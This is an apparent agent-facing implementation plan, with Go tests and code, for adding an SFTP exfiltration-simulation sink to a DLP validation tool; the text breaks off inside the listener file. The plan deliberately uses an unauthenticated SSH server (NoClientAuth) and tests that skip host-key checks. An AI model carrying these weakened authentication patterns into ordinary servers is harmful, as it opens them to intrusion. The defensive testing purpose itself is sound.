# SFTP Exfiltration Channel Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add SFTP as the third sink-verified DLP exfiltration channel — a purpose-built SFTP/SSH listener that records a `dlp_sink_receipts` row when a step's synthetic payload actually reaches it, and fix a real gap in the already-shipped `dlpVerifier` that this channel is the first to expose (a missing client tool would otherwise misread as "DLP blocked it").

**Architecture:** A new `internal/sftpsink` package owns a TCP listener speaking real SSH/SFTP (via `github.com/pkg/sftp` + `golang.org/x/crypto/ssh`, `NoClientAuth: true`), kept structurally separate from the existing HTTP sink (`internal/api/dlp_sink.go`) and DNS listener (`internal/dnssink`), exactly the way those two are separate from each other. It writes into the same `dlp_sink_receipts` table on a successful upload, so `internal/verifysync` and `internal/reporting` need no further schema-level changes — but `internal/reporting/dlp.go`'s `dlpVerifier` does need one new check (Task 1), because this is the first channel where the step's own client tool can be legitimately absent.

**Tech Stack:** Go, `github.com/pkg/sftp` (new dependency), `golang.org/x/crypto/ssh` (already a dependency), PostgreSQL (existing `dlp_sink_tokens`/`dlp_sink_receipts` tables, unchanged), PowerShell (agent-side `sftp.exe`, Windows OpenSSH Client).

**Spec:** `orchestrator/docs/superpowers/specs/2026-09-01-sftp-exfiltration-channel-design.md`

## Global Constraints

- Client-side: native `sftp.exe` only, detected via `Get-Command` at execution time, never installed or bundled. Absent → `skip: sftp.exe (OpenSSH Client) not found on this endpoint`, the existing marker convention `internal/scenario/outcome.go:237`'s `classifyExecution` already recognizes.
- Verdict stays strictly sink-primary — `Succeeded` (token reached the sink) or `Blocked` (it didn't), same as HTTPS/DNS. Local `sftp.exe` output is captured as `DLP_OBSERVATION:` secondary evidence only, never the graded truth.
- Server: `github.com/pkg/sftp` + `golang.org/x/crypto/ssh`, `ssh.ServerConfig{NoClientAuth: true}` — no keypair generation or distribution.
- Token-to-upload correlation via filename (`{{SINK_TOKEN}}.dat`), reusing the **existing 32-byte token path** in `issueSinkTokensAndSubstitute` — no new token byte-length variant.
- New placeholders `{{SINK_SFTP_HOST}}` (reuses the existing `dnsServerHost()` helper) and `{{SINK_SFTP_PORT}}` (configured value, default `2222`).
- Container-internal listener binds `:22` (genuine SSH/SFTP protocol); the **host-published port is a separate, configurable value, default `2222`, never `22`** — every deployment target's host almost certainly already runs a real `sshd` on port 22. `install.sh` must reject `SINK_SFTP_PORT=22` outright, not silently substitute another port.
- Security hardening ships with the listener, not as a follow-up: bounded per-upload byte ceiling (64KB), bounded total in-memory session state, idle-session timeout, per-source-IP rate limit, reject any SFTP operation other than a single write-then-close, never log file content.
- Zero changes to `internal/verifysync` — proven via regression test, not assumed.
- No frontend/`wwwroot` changes.

---

## Task 1: Fix `dlpVerifier` — a `skip:` step must never resolve to `Blocked`

This is independent of everything else in this plan and ships the actual bug fix first: a real gap in already-shipped code (`internal/reporting/dlp.go`), only exposed by this channel because HTTPS and DNS never have an absent client tool.

**Files:**
- Modify: `orchestrator/internal/reporting/dlp.go`
- Modify: `orchestrator/internal/reporting/dlp_test.go`

**Interfaces:**
- Consumes: nothing new.
- Produces: `dlpVerifier.Verify` now resolves any `StepEvidence` whose `RawOutput` starts with `skip:` to `ObservationUnknown`/`StatusUnknown`, regardless of `SinkTokenObserved` — consumed by nothing else in this plan directly, but this is the behavior Task 6's scenario step depends on being correct.

- [ ] **Step 1: Write the failing test**

Add to `orchestrator/internal/reporting/dlp_test.go`:

```go
func TestDLPVerifier_SkipMarker_TakesPrecedenceOverSinkTokenObserved(t *testing.T) {
	// A step whose client tool was absent never attempted a transfer, so
	// SinkTokenObserved=false here is NOT evidence of a blocked
	// exfiltration -- it's the absence of an attempt. Without this check,
	// this would resolve to ObservationBlocked and likely grade as a
	// false "DLP successfully blocked it."
	exp := dlpExp("dlp-sftp-block", "Block")
	r := dlpVerifier{}.Verify(exp, StepEvidence{
		RawOutput:         "skip: sftp.exe (OpenSSH Client) not found on this endpoint",
		SinkTokenObserved: boolPtr(false),
	})
	if r.Status != StatusUnknown {
		t.Errorf("Status = %s, want %s (a skip: marker must never resolve to Blocked)", r.Status, StatusUnknown)
	}
	if r.Comparison != MissingEvidence {
		t.Errorf("Comparison = %v, want MissingEvidence", r.Comparison)
	}
}

func TestDLPVerifier_SkipMarker_CaseInsensitiveAndWhitespaceTolerant(t *testing.T) {
	exp := dlpExp("dlp-sftp-block", "Block")
	r := dlpVerifier{}.Verify(exp, StepEvidence{
		RawOutput:         "  SKIP: sftp.exe not found\nDLP_OBSERVATION: OperationBlocked",
		SinkTokenObserved: boolPtr(true), // even a true receipt must not override a genuine skip
	})
	if r.Status != StatusUnknown {
		t.Errorf("Status = %s, want %s", r.Status, StatusUnknown)
	}
}

func TestDLPVerifier_NoSkipMarker_SinkPrimaryStillWorks(t *testing.T) {
	// Regression: HTTPS/DNS steps never emit skip: -- confirm the new
	// check doesn't touch their existing sink-primary resolution.
	exp := dlpExp("dlp-https-block", "Block")
	r := dlpVerifier{}.Verify(exp, StepEvidence{
		RawOutput:         "EXEC T1567: exfiltration attempt sent. [BAS-SIM-DLP-HTTPS]",
		SinkTokenObserved: boolPtr(false),
	})
	if r.Status != StatusDetected || r.Comparison != Match {
		t.Errorf("Status=%s Comparison=%v, want StatusDetected/Match (unaffected by the new skip: check)", r.Status, r.Comparison)
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/reporting/... -run "TestDLPVerifier_SkipMarker|TestDLPVerifier_NoSkipMarker" -v`
Expected: FAIL — `TestDLPVerifier_SkipMarker_TakesPrecedenceOverSinkTokenObserved` and the case-insensitive test fail with `Status = Detected` (or whatever `ObservationBlocked` currently collapses to), not `Unknown`, since the check doesn't exist yet. The regression test passes already (nothing broken yet) — that's expected and fine.

- [ ] **Step 3: Implement the fix**

In `orchestrator/internal/reporting/dlp.go`, modify `dlpVerifier.Verify`:

```go
func (dlpVerifier) Verify(exp scenario.ExpectedDetection, ev StepEvidence) VerificationResult {
	r := baseResult(exp, ev, "automatic")
	r.ExpectedOutcome = scenario.ResolveExpectedOutcome(exp)

	observed := ObservationUnknown
	if isSkipMarker(ev.RawOutput) {
		// A step that never ran (client tool absent, technique not
		// applicable, etc.) produced no attempt at all -- SinkTokenObserved
		// being false here is the absence of an attempt, not evidence the
		// attempt was blocked. Checked BEFORE SinkTokenObserved so a skip
		// can never resolve to ObservationBlocked. See
		// docs/superpowers/specs/2026-09-01-sftp-exfiltration-channel-design.md.
		r.ObservedOutcome = observed // ObservationUnknown
		r.Comparison = comparatorFor("dlp").Compare(r.ExpectedOutcome, r.ObservedOutcome)
		r.Status = collapseToStatus(r.Comparison)
		return r
	}
	if ev.SinkTokenObserved != nil {
		// Sink-primary: destination-side receipt is authoritative ground
		// truth for whether the data actually left, superseding the local
		// marker for this step -- see
		// docs/superpowers/specs/2026-08-19-dlp-exfiltration-sink-service-design.md.
		if *ev.SinkTokenObserved {
			observed = ObservationSucceeded
		} else {
			observed = ObservationBlocked
		}
	} else if m := dlpMarkerRe.FindStringSubmatch(ev.RawOutput); m != nil {
		switch m[1] {
		case ObservationSucceeded, ObservationBlocked:
			observed = m[1]
		}
	}
	r.ObservedOutcome = observed
	r.Comparison = comparatorFor("dlp").Compare(r.ExpectedOutcome, r.ObservedOutcome)
	r.Status = collapseToStatus(r.Comparison)
	return r
}

// isSkipMarker reports whether raw's first line matches the "skip:"
// convention internal/scenario/outcome.go's classifyExecution already
// established (case-insensitive, leading whitespace tolerated). This is a
// small local equivalent, not a cross-package call: internal/scenario's
// own firstLine/classifyExecution use the identical convention, but
// firstLine is unexported there and this package deliberately stays a
// pure function throughout (see this file's own top-of-file doc comment).
func isSkipMarker(raw string) bool {
	first, _, _ := strings.Cut(strings.TrimLeft(raw, "\r\n"), "\n")
	first = strings.TrimSpace(first)
	return len(first) >= 5 && strings.EqualFold(first[:5], "skip:")
}
```

(`strings` is already imported in `dlp.go` for `dlpMarkerRe`'s use of `regexp`; confirm `strings` itself is imported — if not, add `"strings"` to the import block.)

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/reporting/... -run "TestDLPVerifier" -v`
Expected: PASS — all `TestDLPVerifier_*` tests, including the three new ones and every pre-existing one (`TestDLPVerifier_SinkPrimary_TokenReceived`, `TestDLPVerifier_SinkPrimary_TokenNotReceived`, `TestDLPVerifier_NoSinkToken_UnaffectedByNewLogic`, etc.).

- [ ] **Step 5: Run the full `internal/reporting` suite**

Run: `cd orchestrator && go test ./internal/reporting/... -v -timeout 5m`
Expected: PASS — zero `--- FAIL` lines anywhere in the package, confirming this change is isolated to the DLP verifier path.

- [ ] **Step 6: Commit**

```bash
git add orchestrator/internal/reporting/dlp.go orchestrator/internal/reporting/dlp_test.go
git commit -m "$(cat <<'EOF'
fix(reporting): a skip: step must never resolve to a DLP Blocked verdict

dlpVerifier checked SinkTokenObserved before ever looking at the local
marker, so a step that never attempted a transfer (client tool absent,
technique not applicable) -- which always has SinkTokenObserved=false,
since no attempt means no receipt -- would resolve to
ObservationBlocked and likely grade as "DLP successfully blocked it."
HTTPS and DNS never hit this because their client tools (Invoke-
RestMethod, nslookup) are never absent; SFTP's sftp.exe can be.

Adds one check before the SinkTokenObserved branch: a RawOutput whose
first line matches the existing skip: convention
(internal/scenario/outcome.go's classifyExecution) resolves to
ObservationUnknown/StatusUnknown regardless of what SinkTokenObserved
says. Regression tests confirm HTTPS/DNS steps, which never emit skip:,
are completely unaffected.
EOF
)"
git push
```

---

## Task 2: `internal/sftpsink` — filename validation, bounded write buffer, receipt persistence, rate limiting

Pure, network-free logic first (mirrors how the DNS channel's plan built `reassembler.go`/`protocol.go` before its listener) — testable without binding any socket.

**Files:**
- Create: `orchestrator/internal/sftpsink/session.go`
- Create: `orchestrator/internal/sftpsink/session_test.go`

**Interfaces:**
- Consumes: `dlp_sink_receipts` table (existing, unchanged schema).
- Produces: `const MaxUploadBytes = 64 * 1024`; `func filenameToken(path string) (token string, ok bool)`; `type sessionWriter struct{...}`; `func newSessionWriter(token string, db *pgxpool.Pool, sourceIP string) *sessionWriter`; `func (w *sessionWriter) WriteAt(p []byte, off int64) (int, error)`; `func (w *sessionWriter) Close() error`; `type rateLimiter struct{...}`; `func newRateLimiter(limit int, window time.Duration) *rateLimiter`; `func (rl *rateLimiter) allow(sourceIP string) bool` — all consumed by Task 3's listener/handlers.

- [ ] **Step 1: Add the new dependency**

```bash
cd orchestrator && go get github.com/pkg/sftp
```

This updates `go.mod`/`go.sum`. Confirm with `grep "pkg/sftp" orchestrator/go.mod`.

- [ ] **Step 2: Write the failing tests**

Create `orchestrator/internal/sftpsink/session_test.go`:

```go
package sftpsink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"os"
	"testing"
	"time"

	"github.com/audspect/bas/internal/testutil"
	"github.com/jackc/pgx/v5/pgxpool"
)

var sharedDB *testutil.TestDB

func TestMain(m *testing.M) {
	flag.Parse()
	if testing.Short() {
		os.Exit(m.Run())
	}
	sharedDB = testutil.MustSharedTestDB()
	code := m.Run()
	sharedDB.Cleanup()
	os.Exit(code)
}

func TestFilenameToken_AcceptsExpectedShape(t *testing.T) {
	token, ok := filenameToken("/abcd1234ef567890abcd1234ef567890abcd1234ef567890abcd1234ef5678.dat")
	if !ok {
		t.Fatal("expected the <64-hex-char-token>.dat shape to be accepted")
	}
	if token != "abcd1234ef567890abcd1234ef567890abcd1234ef567890abcd1234ef5678" {
		t.Errorf("token = %q, unexpected", token)
	}
}

func TestFilenameToken_RejectsWrongExtension(t *testing.T) {
	if _, ok := filenameToken("/abcd1234ef567890abcd1234ef567890abcd1234ef567890abcd1234ef5678.txt"); ok {
		t.Error("a non-.dat extension must be rejected")
	}
}

func TestFilenameToken_RejectsNonHexOrWrongLength(t *testing.T) {
	cases := []string{
		"/not-hex-at-all.dat",
		"/abcd.dat",                                                                 // too short
		"/abcd1234ef567890abcd1234ef567890abcd1234ef567890abcd1234ef56780000.dat",    // too long
	}
	for _, c := range cases {
		if _, ok := filenameToken(c); ok {
			t.Errorf("filenameToken(%q) should be rejected", c)
		}
	}
}

func TestFilenameToken_RejectsDirectoryTraversalOrExtraPathSegments(t *testing.T) {
	if _, ok := filenameToken("/sub/abcd1234ef567890abcd1234ef567890abcd1234ef567890abcd1234ef5678.dat"); ok {
		t.Error("a path with directory segments must be rejected -- this listener supports exactly one flat write target")
	}
}

func TestSessionWriter_BufferedThenClosedRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "session1234567890session1234567890session1234567890session1234"
		w := newSessionWriter(token, pool, "10.0.0.7")
		payload := []byte("[BAS-SIM-DLP] synthetic exfil payload")
		n, err := w.WriteAt(payload, 0)
		if err != nil {
			t.Fatalf("WriteAt: %v", err)
		}
		if n != len(payload) {
			t.Fatalf("WriteAt wrote %d bytes, want %d", n, len(payload))
		}
		if err := w.Close(); err != nil {
			t.Fatalf("Close: %v", err)
		}

		var payloadHash string
		var payloadSize int
		var channel, sourceIP string
		if err := pool.QueryRow(context.Background(),
			`SELECT payload_hash, payload_size, channel, source_ip FROM dlp_sink_receipts WHERE token = $1`,
			token,
		).Scan(&payloadHash, &payloadSize, &channel, &sourceIP); err != nil {
			t.Fatalf("query dlp_sink_receipts: %v", err)
		}
		wantSum := sha256.Sum256(payload)
		if payloadHash != hex.EncodeToString(wantSum[:]) {
			t.Errorf("payload_hash = %q, want sha256 of the written content", payloadHash)
		}
		if payloadSize != len(payload) {
			t.Errorf("payload_size = %d, want %d", payloadSize, len(payload))
		}
		if channel != "sftp" {
			t.Errorf("channel = %q, want sftp", channel)
		}
		if sourceIP != "10.0.0.7" {
			t.Errorf("source_ip = %q, want 10.0.0.7", sourceIP)
		}
	})
}

func TestSessionWriter_OversizedWriteRejected(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "oversize1234567890oversize1234567890oversize1234567890oversize"
		w := newSessionWriter(token, pool, "10.0.0.8")
		tooBig := make([]byte, MaxUploadBytes+1)
		if _, err := w.WriteAt(tooBig, 0); err == nil {
			t.Error("a write exceeding MaxUploadBytes must be rejected")
		}
	})
}

func TestSessionWriter_WritesAcrossMultipleCallsAccumulateCorrectly(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "multi1234567890multi1234567890multi1234567890multi1234567890ab"
		w := newSessionWriter(token, pool, "10.0.0.9")
		if _, err := w.WriteAt([]byte("hello, "), 0); err != nil {
			t.Fatalf("first WriteAt: %v", err)
		}
		if _, err := w.WriteAt([]byte("world"), 7); err != nil {
			t.Fatalf("second WriteAt: %v", err)
		}
		if err := w.Close(); err != nil {
			t.Fatalf("Close: %v", err)
		}
		var payloadSize int
		if err := pool.QueryRow(context.Background(),
			`SELECT payload_size FROM dlp_sink_receipts WHERE token = $1`, token,
		).Scan(&payloadSize); err != nil {
			t.Fatalf("query dlp_sink_receipts: %v", err)
		}
		if payloadSize != len("hello, world") {
			t.Errorf("payload_size = %d, want %d (writes at sequential offsets must accumulate, not overwrite)", payloadSize, len("hello, world"))
		}
	})
}

func TestRateLimiter_AllowsUpToLimitThenBlocks(t *testing.T) {
	rl := newRateLimiter(3, time.Minute)
	for i := 0; i < 3; i++ {
		if !rl.allow("10.0.0.1") {
			t.Fatalf("request %d should be allowed within the limit", i+1)
		}
	}
	if rl.allow("10.0.0.1") {
		t.Error("request beyond the limit should be blocked")
	}
}

func TestRateLimiter_TracksSourcesIndependently(t *testing.T) {
	rl := newRateLimiter(1, time.Minute)
	if !rl.allow("10.0.0.1") {
		t.Fatal("first request from 10.0.0.1 should be allowed")
	}
	if !rl.allow("10.0.0.2") {
		t.Error("a different source IP must have its own independent limit")
	}
}
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/sftpsink/... -v`
Expected: FAIL to compile — package `sftpsink` doesn't exist yet.

- [ ] **Step 4: Implement `session.go`**

Create `orchestrator/internal/sftpsink/session.go`:

```go
// Package sftpsink implements a purpose-built SFTP exfiltration sink for
// the DLP validation suite -- a minimal SSH/SFTP listener that accepts
// exactly one operation (write a file named <token>.dat) and records a
// destination-side receipt on completion, never a general-purpose SFTP
// server. See
// docs/superpowers/specs/2026-09-01-sftp-exfiltration-channel-design.md.
package sftpsink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"path"
	"regexp"
	"sync"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
)

// MaxUploadBytes bounds the total bytes this listener will buffer for a
// single upload. The synthetic [BAS-SIM-DLP] record is small (well under
// 1KB); this is a generous but firm ceiling that rejects anything
// abusive before it can grow an unbounded in-memory buffer.
const MaxUploadBytes = 64 * 1024

// filenamePattern matches exactly the shape this listener expects:
// <64-hex-char-token>.dat with no directory segments. The token length
// (64 hex chars) matches generateSinkToken(32)'s hex-encoded output
// exactly, since SFTP reuses the HTTP channel's existing 32-byte token
// unchanged -- see the design spec's Decisions section.
var filenamePattern = regexp.MustCompile(`^[0-9a-f]{64}\.dat$`)

// filenameToken extracts the token from an SFTP-requested path, returning
// ok=false for anything that doesn't match exactly the expected flat
// <token>.dat shape -- including directory segments, wrong extension,
// wrong length, or non-hex content. This listener has no legitimate use
// for any other filename shape and rejects everything else before
// allocating any buffer.
func filenameToken(reqPath string) (token string, ok bool) {
	if path.Dir(reqPath) != "/" && path.Dir(reqPath) != "." {
		return "", false
	}
	base := path.Base(reqPath)
	if !filenamePattern.MatchString(base) {
		return "", false
	}
	return base[:len(base)-len(".dat")], true
}

// sessionWriter buffers one upload's bytes in memory and, on Close,
// hashes the content and writes one dlp_sink_receipts row -- mirroring
// internal/api/dlp_sink.go's DLPSink insert shape exactly (same table,
// same "hash + length only, never the raw payload" rule already
// established by the HTTP and DNS channels). Not safe for concurrent use
// by multiple goroutines on the same instance beyond WriteAt's own
// locking -- pkg/sftp serializes writes to a single request's WriterAt in
// practice, but the lock here costs nothing and removes any doubt.
type sessionWriter struct {
	mu       sync.Mutex
	token    string
	buf      []byte
	db       *pgxpool.Pool
	sourceIP string
}

func newSessionWriter(token string, db *pgxpool.Pool, sourceIP string) *sessionWriter {
	return &sessionWriter{token: token, db: db, sourceIP: sourceIP}
}

// WriteAt grows the internal buffer to accommodate off+len(p), rejecting
// the write outright once the total would exceed MaxUploadBytes -- the
// buffer is never allowed to grow past that ceiling even transiently.
func (w *sessionWriter) WriteAt(p []byte, off int64) (int, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	end := int(off) + len(p)
	if end > MaxUploadBytes {
		return 0, fmt.Errorf("upload exceeds the %d-byte limit", MaxUploadBytes)
	}
	if end > len(w.buf) {
		grown := make([]byte, end)
		copy(grown, w.buf)
		w.buf = grown
	}
	copy(w.buf[off:end], p)
	return len(p), nil
}

// Close computes the SHA-256 of everything buffered and writes exactly
// one dlp_sink_receipts row. The raw payload is discarded immediately
// after -- never persisted, matching both existing channels exactly.
func (w *sessionWriter) Close() error {
	w.mu.Lock()
	content := w.buf
	w.buf = nil
	w.mu.Unlock()

	sum := sha256.Sum256(content)
	_, err := w.db.Exec(context.Background(),
		`INSERT INTO dlp_sink_receipts (token, source_ip, payload_hash, payload_size, channel)
		 VALUES ($1, $2, $3, $4, $5)`,
		w.token, w.sourceIP, hex.EncodeToString(sum[:]), len(content), "sftp",
	)
	return err
}

// rateLimiter is a coarse, fixed-window per-source-IP abuse guard --
// identical in shape to internal/dnssink's own rateLimiter, duplicated
// here rather than shared because that type is unexported in dnssink and
// this listener has no other reason to import that package. Not a
// precision rate limiter, adequate for a low-throughput purpose-built
// listener that only ever expects traffic from BAS agents running a
// scenario step.
type rateLimiter struct {
	mu     sync.Mutex
	limit  int
	window time.Duration
	counts map[string]*windowCount
}

type windowCount struct {
	count      int
	windowEnds time.Time
}

func newRateLimiter(limit int, window time.Duration) *rateLimiter {
	return &rateLimiter{limit: limit, window: window, counts: map[string]*windowCount{}}
}

// allow reports whether sourceIP may open another connection in the
// current window, incrementing its count as a side effect.
func (rl *rateLimiter) allow(sourceIP string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	wc, ok := rl.counts[sourceIP]
	if !ok || now.After(wc.windowEnds) {
		rl.counts[sourceIP] = &windowCount{count: 1, windowEnds: now.Add(rl.window)}
		return true
	}
	wc.count++
	return wc.count <= rl.limit
}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/sftpsink/... -v`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add orchestrator/go.mod orchestrator/go.sum orchestrator/internal/sftpsink/session.go orchestrator/internal/sftpsink/session_test.go
git commit -m "$(cat <<'EOF'
feat(sftpsink): filename validation, bounded write buffer, receipt persistence, rate limiting

New internal/sftpsink package, kept structurally separate from the
existing HTTP sink and DNS listener. filenameToken accepts exactly the
<64-hex-char-token>.dat shape this listener needs and rejects everything
else (directory segments, wrong extension, wrong length) before any
buffer is allocated. sessionWriter buffers a single upload up to a
64KB ceiling and writes one dlp_sink_receipts row on Close using the
same insert shape (hash + length only, never raw content) both existing
channels already use. rateLimiter is a coarse per-source-IP guard,
duplicated from internal/dnssink's identical (unexported, unshareable)
type rather than forcing a premature shared abstraction across packages.
EOF
)"
git push
```

---

## Task 3: `internal/sftpsink` — SSH/SFTP listener

Wires Task 2's session handling into a real TCP socket speaking SSH/SFTP.

**Files:**
- Create: `orchestrator/internal/sftpsink/listener.go`
- Create: `orchestrator/internal/sftpsink/listener_test.go`

**Interfaces:**
- Consumes: `filenameToken`/`newSessionWriter`/`MaxUploadBytes` (Task 2); `dlp_sink_receipts` table.
- Produces: `type Status struct { State, Reason, Bind string }`; `type Listener struct{...}`; `func NewListener(addr string, db *pgxpool.Pool) (*Listener, error)`; `func (l *Listener) LocalAddr() net.Addr`; `func (l *Listener) Serve(ctx context.Context)`; `func (l *Listener) Status() Status`; `func (l *Listener) Close() error`; `func StartListener(ctx context.Context, addr string, db *pgxpool.Pool) *Listener` — consumed by Task 4's `cmd/server/main.go` wiring.

- [ ] **Step 1: Write the failing tests**

Create `orchestrator/internal/sftpsink/listener_test.go`:

```go
package sftpsink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"net"
	"testing"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

func TestNewListener_BindsEphemeralPortAndReportsRunning(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		st := l.Status()
		if st.State != "running" {
			t.Errorf("State = %q, want running", st.State)
		}
		if st.Bind == "" {
			t.Error("Bind should report the actual bound address")
		}
	})
}

// sftpClient dials l, completes the SSH handshake with NoClientAuth (no
// credential presented -- the whole point of the server's own
// NoClientAuth: true config), and returns an *sftp.Client ready to use.
func sftpClient(t *testing.T, addr string) *sftp.Client {
	t.Helper()
	conn, err := ssh.Dial("tcp", addr, &ssh.ClientConfig{
		User:            "dlptest",
		Auth:            nil,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Fatalf("ssh.Dial: %v", err)
	}
	client, err := sftp.NewClient(conn)
	if err != nil {
		t.Fatalf("sftp.NewClient: %v", err)
	}
	return client
}

func TestListener_UploadRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		client := sftpClient(t, l.LocalAddr().String())
		defer client.Close()

		token := "listenertest1234listenertest1234listenertest1234listenertest12"
		payload := []byte("[BAS-SIM-DLP] listener integration test payload")
		f, err := client.Create(token + ".dat")
		if err != nil {
			t.Fatalf("Create: %v", err)
		}
		if _, err := f.Write(payload); err != nil {
			t.Fatalf("Write: %v", err)
		}
		if err := f.Close(); err != nil {
			t.Fatalf("Close: %v", err)
		}

		var payloadHash string
		var payloadSize int
		deadline := time.Now().Add(5 * time.Second)
		for {
			err := pool.QueryRow(context.Background(),
				`SELECT payload_hash, payload_size FROM dlp_sink_receipts WHERE token = $1`,
				token,
			).Scan(&payloadHash, &payloadSize)
			if err == nil {
				break
			}
			if time.Now().After(deadline) {
				t.Fatalf("no dlp_sink_receipts row for token within 5s: %v", err)
			}
			time.Sleep(50 * time.Millisecond)
		}
		wantSum := sha256.Sum256(payload)
		if payloadHash != hex.EncodeToString(wantSum[:]) {
			t.Errorf("payload_hash mismatch")
		}
		if payloadSize != len(payload) {
			t.Errorf("payload_size = %d, want %d", payloadSize, len(payload))
		}
	})
}

func TestListener_RejectsUnexpectedFilename(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		client := sftpClient(t, l.LocalAddr().String())
		defer client.Close()

		if _, err := client.Create("not-a-valid-token-name.txt"); err == nil {
			t.Error("Create with a non-<token>.dat filename should be rejected by the server")
		}
	})
}

func TestListener_ListAndReadRejected(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		client := sftpClient(t, l.LocalAddr().String())
		defer client.Close()

		if _, err := client.ReadDir("/"); err == nil {
			t.Error("directory listing should be rejected -- this listener has no legitimate use for it")
		}
	})
}

func TestListener_OversizedUploadRejected(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		client := sftpClient(t, l.LocalAddr().String())
		defer client.Close()

		token := "oversized123456oversized123456oversized123456oversized123456ab"
		f, err := client.Create(token + ".dat")
		if err != nil {
			t.Fatalf("Create: %v", err)
		}
		defer f.Close()
		tooBig := make([]byte, MaxUploadBytes+1024)
		if _, err := f.Write(tooBig); err == nil {
			t.Error("a write exceeding MaxUploadBytes should surface an error to the SFTP client")
		}
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/sftpsink/... -v`
Expected: FAIL to compile — `NewListener`, `Listener`, `Status`, `Serve`, `LocalAddr`, `Close` undefined.

- [ ] **Step 3: Implement `listener.go`**

Create `orchestrator/internal/sftpsink/listener.go`:

```go
package sftpsink

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

// idleSessionTimeout bounds how long a connected-but-idle SSH session may
// sit open. Matches the 10-minute sinkTokenTTL used elsewhere in the DLP
// sink architecture (internal/api/dlp_sink.go) as a shared, generous
// ceiling for how long a step's own dispatch-to-completion window could
// plausibly take.
const idleSessionTimeout = 10 * time.Minute

// rateLimitPerSecond is a coarse per-source-IP abuse guard, not a
// precision limiter -- this listener only ever expects traffic from BAS
// agents running a scenario step, matching internal/dnssink's identical
// rationale for its own rate limiter.
const rateLimitPerSecond = 5

// maxConcurrentSessions bounds total in-memory session state across all
// connections, evicting nothing selectively -- once at the ceiling, new
// connections are simply refused until one closes.
const maxConcurrentSessions = 50

// Status reports a Listener's current health.
type Status struct {
	State  string // "running" | "failed"
	Reason string // populated when State == "failed"
	Bind   string // the actual bound address, e.g. "0.0.0.0:22"; empty when failed
}

// Listener owns a TCP socket and the SSH server config used to accept
// SFTP-only sessions. NoClientAuth: true means no credential is ever
// checked -- the per-upload filename token is what correlates an upload
// to a run, exactly like the HTTP sink's per-attempt token is what
// prevents a garbage POST from proving anything, not conventional auth.
type Listener struct {
	ln         net.Listener
	sshConfig  *ssh.ServerConfig
	db         *pgxpool.Pool
	limiter    *rateLimiter
	sessionsMu sync.Mutex
	sessions   int
	status     atomic.Value
}

func (l *Listener) setStatus(s Status) { l.status.Store(s) }

// Status is safe to call concurrently with Serve.
func (l *Listener) Status() Status {
	v := l.status.Load()
	if v == nil {
		return Status{State: "unknown"}
	}
	return v.(Status)
}

// newHostSigner generates a fresh, in-memory ED25519 host key. Never
// persisted to disk and never verified by the client
// (-oStrictHostKeyChecking=no in the scenario's own PowerShell) -- a Go
// SSH server requires at least one host key to start at all, but this
// listener has no durable identity to protect, matching the
// no-credential-management philosophy NoClientAuth already establishes.
